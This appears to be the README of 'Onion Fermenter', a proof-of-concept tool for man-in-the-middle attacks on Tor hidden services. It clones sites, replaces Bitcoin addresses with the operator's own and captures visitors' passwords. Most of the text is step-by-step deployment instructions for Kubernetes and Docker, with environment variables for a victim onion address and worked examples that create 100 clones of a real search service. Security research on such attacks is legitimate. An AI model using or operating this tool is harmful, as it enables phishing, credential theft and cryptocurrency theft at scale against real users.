Onion Fermenter (OF)
=====

A proof of concept for Bitcoin stealing man-in-the-middle (MitM) attacks against TOR hidden services on a large scale. Writeup [here](https://shufflingbytes.com/posts/ripping-off-professional-criminals-by-fermenting-onions-phishing-darknet-users-for-bitcoins/).

[![asciicast](https://asciinema.org/a/DQOE7J2ygPQ9tY7rLQSJIlZPs.png)](https://asciinema.org/a/DQOE7J2ygPQ9tY7rLQSJIlZPs)

With OF, you can create any number of clones of web hidden services that function just like the original but with bitcoin addresses on pages replaced with your own.
You can monitor any users lured to use these clone pages, steal their passwords, and snatch the bitcoin they spend on the sites.

With minor changes, OF can be used to steal other virtual currencies as well.

# Usage

OF is implemented as a containerized application that is configured using environment variables and a file mount.
You can run it with Docker, but the full power is unleashed with the scalability and redundancy of Kubernetes.

## Preparations
What you need:
- Bitcoin addresses to receive funds
- TOR onion address(es) you want to attack

Bitcoin addresses you can get by creating a local wallet using [Electrum](https://electrum.org/#home), and [pre-generating](https://electrum.readthedocs.io/en/latest/faq.html#how-can-i-pre-generate-new-addresses) for example 1000 addresses. 
Put the addresses into a file, one address per line.
Bitcoin addresses on the clone pages will be replaced with randomly picked addresses from this file.

Note: Replacing addresses must be of same length as the ones that get replaced. This means it may be useful to have addresses of all types and lengths in the file.

## Running on Kubernetes
### Prerequisites
- Kubernetes cluster + kubectl configured to use it
- make
- helm

### Deploy to Kubernetes

This will create NREPLICAS clones of the victim onion service VICTIM_ONION_ID, and the original bitcoin addresses will be replaced by those in ADDRESS_FILE.

```
export NREPLICAS=<number of replicas to create>
export VICTIM_ONION_ID=<victim onion domain without .onion suffix>
export ADDRESS_FILE=<absolute path to a file with your receiving bitcoin addresses>
make deploy
```

Note: It takes a while for the services to be available (~60 seconds).

You can change the configuration of an already running deployment by modifying the NREPLICAS and ADDRESS_FILE environment variables to your liking and running `make deploy` again.

### Get the onion addresses of your clones

This will get all the onion addresses of the clones you created of the victim onion service VICTIM_ONION_ID. If VICTIM_ONION_ID is not set, it will get the clone addresses for all victim services.

```
export VICTIM_ONION_ID=<victim onion domain without .onion suffix>
make get-addresses
```

Note: The addresses change if the corresponding pods are restarted. The pods contain liveness checks and will automatically restart containers that remain unavailable for long enough.

### View and manage your clones

The clones will be deployed in the Kubernetes namespace "onionfermenter" using helm. You can interact with them as with any Kubernetes resources. 

```
helm ls -n onionfermenter
kubectl -n onionfermenter get deployments
kubectl -n onionfermenter get pods
```

Delete all related resources
```
kubectl delete namespace onionfermenter
```

### Example

Create 100 clones of Ahmia and replace all addresses with Torproject's donate address

```
git clone https://github.com/ValtteriL/OnionFermenter.git
cd OnionFermenter

cat > bitcoin-addresses.txt << EOF
bc1qtt04zfgjxg7lpqhk9vk8hnmnwf88ucwww5arsd
EOF

export ADDRESS_FILE="`realpath bitcoin-addresses.txt`"
export NREPLICAS=100
export VICTIM_ONION_ID=juhanurmihxlp77nkq76byazcldy2hlmovfu2epvl5ankdibsot4csyd

make deploy
```

## Running on Docker
### Prerequisites
- make
- docker

### Deploy

This will create a single clone of the victim onion service VICTIM_ONION_ID, and the original bitcoin addresses will be replaced by those in ADDRESS_FILE.

```
export VICTIM_ONION_ID=<victim onion domain without .onion suffix>
export ADDRESS_FILE=<absolute path to a file with your receiving bitcoin addresses>
make run # sudo -E make run
```

Note: It takes a while for the services to be available (~60-300 seconds).

### Get the onion addresses of your clones

This will get all the onion addresses of the clones you created of the victim onion service VICTIM_ONION_ID.

```
export VICTIM_ONION_ID=<victim onion domain without .onion suffix>
make get-addresses-docker # sudo -E make get-addresses-docker
```

### View and manage your clones

The clones will have the VICTIM_ONION_ID as the prefix of their names. You can use the usual docker commands to manage them. 

```
docker ps
```

Delete clone
```
docker rm --force <container id or VICTIM_ONION_ID>
```

### Example

Create a single clone of Ahmia and replace all addresses with Torproject's donate address

```
git clone https://github.com/ValtteriL/OnionFermenter.git
cd OnionFermenter

cat > bitcoin-addresses.txt << EOF
bc1qtt04zfgjxg7lpqhk9vk8hnmnwf88ucwww5arsd
EOF

export ADDRESS_FILE="`realpath bitcoin-addresses.txt`"
export VICTIM_ONION_ID=juhanurmihxlp77nkq76byazcldy2hlmovfu2epvl5ankdibsot4csyd

make run # sudo -E make run
```

# Development

Notes to self

## Build + push container:
```
make build
make push
```
